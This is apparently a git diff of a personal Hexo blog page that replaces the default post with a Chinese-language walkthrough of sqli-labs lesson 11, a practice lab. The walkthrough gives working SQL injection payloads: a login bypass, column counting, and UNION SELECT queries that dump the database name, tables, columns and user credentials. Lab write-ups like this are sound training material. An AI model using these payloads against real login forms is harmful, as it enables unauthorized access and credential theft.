@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/06/21/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/25/sqli-labs-les11/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="OC">
@@ -251,7 +251,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/06/21/hello-world/" itemprop="url">Hello World</a></h1>
+                <a class="post-title-link" href="/2019/07/25/sqli-labs-les11/" itemprop="url">sqli-labs-master_les11</a></h1>
         
 
         <div class="post-meta">
@@ -263,8 +263,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-21T10:25:09+08:00">
-                2019-06-21
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T20:44:46+08:00">
+                2019-07-25
               </time>
             
 
@@ -273,6 +273,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs/" itemprop="url" rel="index">
+                    <span itemprop="name">sqli-labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -303,21 +325,69 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+            <h1 id="sqli-labs-master-les11-POST-Error-Based-Single-quotes-String"><a href="#sqli-labs-master-les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="sqli-labs-master les11:POST-Error Based-Single quotes-String"></a>sqli-labs-master les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-les11/start.png" title="start">
+<p>一开始如上图所示.<br>由题得知这是一道POST报错型(单引号那种语句)的题<br>有了前面简单的GET类型的题,那么就先试一下</p>
+<blockquote>
+<p>Username:admin<br>Password:1</p>
+</blockquote>
+<p>然后就</p>
+<img src="/2019/07/25/sqli-labs-les11/failed1.png" title="failed">
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>再试试</p>
+<blockquote>
+<p>Username:admin<br>Password:1’ or 1=1 %23</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-les11/failed2.png" title="failed">
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>看到报错</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>就知道这#不能用%23了…都是GET顺手的锅都是顺手的锅<br>把%23改为#之后</p>
+<blockquote>
+<p>Username:admin<br>Password:1’ or 1=1#</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-les11/successfully.png" title="successfully">
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>然后</p>
+<blockquote>
+<p>1’ order by 3#</p>
+</blockquote>
+<p>报错</p>
+<blockquote>
+<p>1’ order by 2#</p>
+</blockquote>
+<p>没问题<br>看了一下源码:</p>
+<blockquote>
+<p>$sql=”SELECT username, password FROM users WHERE username=’$uname’ and password=’$passwd’ LIMIT 0,1”;</p>
+</blockquote>
+<p>然而上面所做的…就是我看WP之前所能做的…<br>接下来,<a href="https://blog.csdn.net/qq_28295425/article/details/78905840" target="_blank" rel="noopener">看WP-Recar</a><br>发现原来是可以直接在username闭合然后注释掉后面的语句…我还以为要在password搞</p>
+<blockquote>
+<p>Username:’ union select database(),version()#↓</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-les11/dbname&version.png" title="dbname&version">
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 123</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Username:’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-les11/tables.png" title="tables">
 
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<blockquote>
+<p>Username:’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#↓</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-les11/columns.png" title="columns">
+
+<blockquote>
+<p>Username:’ union select group_concat(username),group_concat(password)from users#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-les11/username&passwd.png" title="username&passwd">
+
+<blockquote>
+<p>Username:’ union select 1,group_concat(id)from users#👇</p>
+</blockquote>
+<img src="/2019/07/25/sqli-labs-les11/id.png" title="id">
+
+<p>les11[完]–2019-7-26 19:58</p>
 
           
         
@@ -406,13 +476,41 @@
             
 
             
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
 
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
             
 
           </nav>
 
           
 
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/OCgittt" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
           
 
           
